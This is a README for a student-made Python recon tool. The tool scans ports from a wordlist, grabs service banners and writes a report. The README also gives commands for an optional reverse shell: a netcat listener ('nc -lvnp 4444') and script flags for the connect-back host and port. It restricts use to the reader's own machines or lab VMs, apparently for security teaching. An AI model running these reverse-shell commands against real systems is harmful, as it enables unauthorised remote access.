# Recon Tool

this is a python tool we made for the cybersecurity project.
it scans ports, grabs banners, and has a reverse shell option.

## files

- main.py - the main script
- wordlist.txt - list of ports to scan

## how to run

basic scan:
```
python main.py -t 192.168.1.10 -w wordlist.txt
```

with reverse shell (open netcat first: nc -lvnp 4444):
```
python main.py -t 192.168.1.10 -w wordlist.txt --shell --lhost 192.168.1.5 --lport 4444
```

help menu:
```
python main.py --help
```

## what it does

1. reads ports from wordlist.txt and scans them one by one
2. shows if each port is open or closed
3. tries to grab the banner from open ports
4. saves everything to discovery_report.txt
5. optional: connects a reverse shell back to your machine

## notes

- only use this on your own machines or lab vms
- tested on linux
